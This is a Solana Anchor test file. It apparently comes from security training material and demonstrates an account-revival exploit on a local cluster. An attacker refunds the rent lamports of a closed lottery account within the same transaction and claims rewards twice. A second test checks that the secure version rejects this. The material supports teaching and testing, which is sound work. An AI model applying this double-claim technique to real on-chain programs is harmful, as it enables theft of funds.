import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { ClosingAccounts } from "../target/types/closing_accounts";
import {
  PublicKey,
  Keypair,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
  getOrCreateAssociatedTokenAccount,
  createMint,
  getAccount,
} from "@solana/spl-token";
import { safeAirdrop } from "./utils/utils";
import { assert, expect } from "chai";

describe("closing-accounts", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());
  const provider = anchor.AnchorProvider.env();
  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>;
  const attacker = Keypair.generate();
  let attackerAta: PublicKey = null;
  let rewardMint: PublicKey = null;
  let mintAuth: PublicKey = null;

  it("Enter lottery should be successful", async () => {
    const [mint, mintBump] = PublicKey.findProgramAddressSync(
      [Buffer.from("mint-seed")],
      program.programId
    );
    mintAuth = mint;

    await safeAirdrop(attacker.publicKey, provider.connection);

    rewardMint = await createMint(
      provider.connection,
      attacker,
      mintAuth,
      null,
      6
    );

    const associatedAcct = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      attacker,
      rewardMint,
      attacker.publicKey
    );
    attackerAta = associatedAcct.address;

    // tx to enter lottery
    await program.methods
      .enterLottery()
      .accounts({
        user: attacker.publicKey,
        userAta: attackerAta,
      })
      .signers([attacker])
      .rpc();
  });

  const [attackerLotteryEntry, bump] = PublicKey.findProgramAddressSync(
    [Buffer.from("test-seed"), attacker.publicKey.toBuffer()],
    program.programId
  );

  it("attacker can close + refund lottery acct + claim multiple rewards successfully", async () => {
    // claim multiple times
    for (let i = 0; i < 2; i++) {
      let tokenAcct = await getAccount(provider.connection, attackerAta);

      const tx = new Transaction();

      // instruction claims rewards, program will try to close account
      tx.add(
        await program.methods
          .redeemWinningsInsecure()
          .accounts({
            userAta: attackerAta,
            rewardMint: rewardMint,
            user: attacker.publicKey,
          })
          .signers([attacker])
          .instruction()
      );

      // user adds instruction to refund dataAccount lamports
      const rentExemptLamports =
        await provider.connection.getMinimumBalanceForRentExemption(
          82,
          "confirmed"
        );
      tx.add(
        SystemProgram.transfer({
          fromPubkey: attacker.publicKey,
          toPubkey: attackerLotteryEntry,
          lamports: rentExemptLamports,
        })
      );
      // send tx
      await sendAndConfirmTransaction(provider.connection, tx, [attacker]);
      await new Promise((x) => setTimeout(x, 5000));
    }

    const tokenAcct = await getAccount(provider.connection, attackerAta);

    const lotteryEntry = await program.account.lotteryAccount.fetch(
      attackerLotteryEntry
    );

    expect(Number(tokenAcct.amount)).to.equal(
      lotteryEntry.timestamp.toNumber() * 10 * 2
    );
  });

  it("attacker claiming multiple rewards with secure claim should throw an exception", async () => {
    const tx = new Transaction();
    // instruction claims rewards, program will try to close account
    tx.add(
      await program.methods
        .redeemWinningsSecure2()
        .accounts({
          user: attacker.publicKey,
          userAta: attackerAta,
          rewardMint: rewardMint,
        })
        .instruction()
    );

    // user adds instruction to refund dataAccount lamports
    const rentExemptLamports =
      await provider.connection.getMinimumBalanceForRentExemption(
        82,
        "confirmed"
      );
    tx.add(
      SystemProgram.transfer({
        fromPubkey: attacker.publicKey,
        toPubkey: attackerLotteryEntry,
        lamports: rentExemptLamports,
      })
    );
    // send tx
    await sendAndConfirmTransaction(provider.connection, tx, [attacker]);

    try {
      await program.methods
        .redeemWinningsSecure2()
        .accounts({
          user: attacker.publicKey,
          userAta: attackerAta,
          rewardMint: rewardMint,
        })
        .signers([attacker])
        .rpc();
    } catch (error) {
      console.log(error.message);
      expect(error);
      return;
    }

    assert.fail("should throw an exception");
  });
});
